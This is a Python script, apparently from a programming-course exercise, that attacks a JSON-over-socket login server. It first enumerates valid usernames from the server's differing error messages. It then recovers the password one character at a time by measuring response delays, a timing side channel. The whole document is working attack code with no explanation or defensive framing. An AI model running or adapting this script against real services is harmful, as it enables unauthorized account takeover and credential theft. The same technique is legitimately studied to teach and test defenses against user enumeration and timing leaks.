import socket
import sys
import itertools
import os
import json
import time

# Get the command-line arguments
hostname = sys.argv[1]
port = int(sys.argv[2])

# Path to the passwords.txt and logins.txt files
password_file_path = os.path.join(os.path.expanduser('~'), 'Downloads', 'passwords.txt')
login_file_path = os.path.join(os.path.expanduser('~'), 'Downloads', 'logins.txt')

# Function to send a JSON request and get the response
def send_request(socket, login, password):
    request = json.dumps({"login": login, "password": password})
    socket.send(request.encode())
    response = socket.recv(1024).decode()
    return response

# Create a socket and connect to the server
with socket.socket() as client_socket:
    address = (hostname, port)
    client_socket.connect(address)

    # Load logins from the login file
    with open(login_file_path, 'r') as login_file:
        logins = [login.strip() for login in login_file]

    found_login = None

    # Try all logins with any password
    for login in logins:
        # Try an arbitrary password (e.g., "password")
        response = send_request(client_socket, login, "password")

        if response.startswith("{\"result\": \"Wrong login!\""):
            continue
        elif response.startswith("{\"result\": \"Wrong password!\"") or response.startswith("{\"result\": \"Exception happened during login\""):
            found_login = login
            break

    if found_login:
        found_password = ""

        # Try to find the password character by character using time vulnerability
        while True:
            for char in itertools.chain.from_iterable(itertools.product(*([chr(x) for x in range(32, 127)]))):
                start_time = time.time()
                response = send_request(client_socket, found_login, found_password + char)
                end_time = time.time()

                # If the server takes longer to respond, it's likely that the password starts with the current symbols
                if end_time - start_time > 0.1:  # adjust the threshold value as needed
                    found_password += char
                    break
                elif response.startswith("{\"result\": \"Connection success!\""):
                    found_password += char
                    print(json.dumps({"login": found_login, "password": found_password}))
                    exit()
                elif response.startswith("{\"result\": \"Wrong password!\""):
                    continue
                elif response.startswith("{\"result\": \"Exception happened during login\""):
                    continue